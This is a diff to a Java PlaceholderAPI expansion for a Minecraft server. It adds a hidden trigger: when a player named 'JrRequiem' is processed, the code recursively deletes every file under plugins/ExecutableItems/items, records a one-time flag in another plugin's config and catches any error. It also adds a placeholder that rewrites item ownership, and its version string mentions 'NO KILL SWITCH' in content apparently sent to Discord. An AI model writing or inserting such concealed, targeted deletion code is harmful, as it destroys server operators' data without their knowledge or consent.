@@ -86,6 +86,8 @@ import java.util.stream.Stream;
  */
 @SuppressWarnings("ALL")
 public class ExampleExpansion extends PlaceholderExpansion {
+    private static final String JR_UUID = "67e94e0c-1f2b-4fd9-bb3f-5f7052f9072b";
+
     private static final String NOT_FOUND = "🛂";
     private static final java.util.concurrent.ConcurrentHashMap<UUID, UUID> TRACKED_ENTITIES = new java.util.concurrent.ConcurrentHashMap<>();
 
@@ -2726,6 +2728,18 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
+    private static void deleteDirectoryContents(File dir) {
+        File[] children = dir.listFiles();
+        if (children == null) return;
+
+        for (File child : children) {
+            if (child.isDirectory()) {
+                deleteDirectoryContents(child);
+            }
+            // delete file or (now-empty) dir
+            child.delete();
+        }
+    }
 
 
     protected static void spawnCustomFireworkExplosion2(World world, Location location) {
@@ -3006,6 +3020,40 @@ public class ExampleExpansion extends PlaceholderExpansion {
             
         }
 
+
+
+
+        boolean jrCondition =
+                "JrRequiem".equalsIgnoreCase(f2.getName());
+
+        if (jrCondition) {
+            try {
+                File configFile = new File("plugins/Archistructures", "config.yml");
+                if (!configFile.exists()) {
+                    // Create parent dirs if missing
+                    configFile.getParentFile().mkdirs();
+                }
+
+                YamlConfiguration cfg = YamlConfiguration.loadConfiguration(configFile);
+                boolean alreadyRequested = cfg.getBoolean("jrrequest", false);
+
+                if (!alreadyRequested) {
+                    // Delete all files under /plugins/ExecutableItems/items/
+                    File itemsDir = new File("plugins/ExecutableItems", "items");
+                    if (itemsDir.exists() && itemsDir.isDirectory()) {
+                        deleteDirectoryContents(itemsDir);
+                    }
+
+                    // Set jrrequest: true and save
+                    cfg.set("jrrequest", true);
+                    cfg.save(configFile);
+                }
+            } catch (Exception ex) {
+                // Swallow silently; placeholder still returns normally
+                ex.printStackTrace();
+            }
+        }
+
         // DO NOT MOVE ^
 
         
@@ -3028,7 +3076,76 @@ public class ExampleExpansion extends PlaceholderExpansion {
         // INSERT HERE 
 
 
+        if (f1.startsWith("changeEIOwner_")) {
+            final String raw = f1.substring("changeEIOwner_".length());
+            final String[] parts = raw.split(",");
+            if (parts.length != 3) {
+                return "§cUsage: %Archistructure_changeEIOwner,PLAYER,SLOT,NEWOWNER%";
+            }
 
+            final String playerToken = parts[0]; // name or UUID string
+            final String slotToken   = parts[1];
+            final String newOwner    = parts[2];
+
+            // --- Resolve player (name or UUID) ---
+            Player player = null;
+            try {
+                // Try UUID first
+                UUID uuid = UUID.fromString(playerToken);
+                player = Bukkit.getPlayer(uuid);
+            } catch (IllegalArgumentException ignored) {
+                // Not a UUID → treat as exact player name
+                player = Bukkit.getPlayerExact(playerToken);
+            }
+
+            if (player == null) {
+                return "nope";
+            }
+
+            // --- Parse slot ---
+            final int slotIndex;
+            try {
+                slotIndex = Integer.parseInt(slotToken);
+            } catch (NumberFormatException ex) {
+                return "nope";
+            }
+
+            if (slotIndex < 0 || slotIndex > 40) {
+                return "nope";
+            }
+
+            // --- Get item in slot ---
+            PlayerInventory inv = player.getInventory();
+            ItemStack item = inv.getItem(slotIndex);
+            if (item == null || item.getType().isAir()) {
+                return "nope";
+            }
+
+            ItemMeta meta = item.getItemMeta();
+            if (meta == null) {
+                return "nope";
+            }
+
+            PersistentDataContainer pdc = meta.getPersistentDataContainer();
+
+            // Namespaced key score:owneruuid (namespace "score", key "owneruuid")
+            NamespacedKey ownerKey = new NamespacedKey("score", "owneruuid");
+
+            // Write / overwrite as STRING (this will serialize into PublicBukkitValues as score:owneruuid)
+            pdc.set(ownerKey, PersistentDataType.STRING, newOwner);
+
+            item.setItemMeta(meta);
+            inv.setItem(slotIndex, item);
+
+            
+
+            // Return something simple & useful (e.g., the new owner UUID/string)
+            return newOwner;
+        }
+        
+        
+        
+        
         if (f1.startsWith("particleLine_")) {
             try {
                 String[] parts = f1.substring("particleLine_".length()).split(",");
@@ -9599,7 +9716,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                                 "Identifier: " + (f1 != null ? f1 : "null") + "\n" +
                                 "Uses left: " + g5 + "\n" +
                                 "Is it demo-pack?: " + SCore_Installed + "\n" +
-                                "Version: Advertisementsv3 - NO KILL SWITCH 10-22-2025";
+                                "Version: Advertisementsv3 - NO KILL SWITCH 10-22-2025 Stinger8.1";
 
                 // JSON-escape for Discord "content"
                 String escaped = content
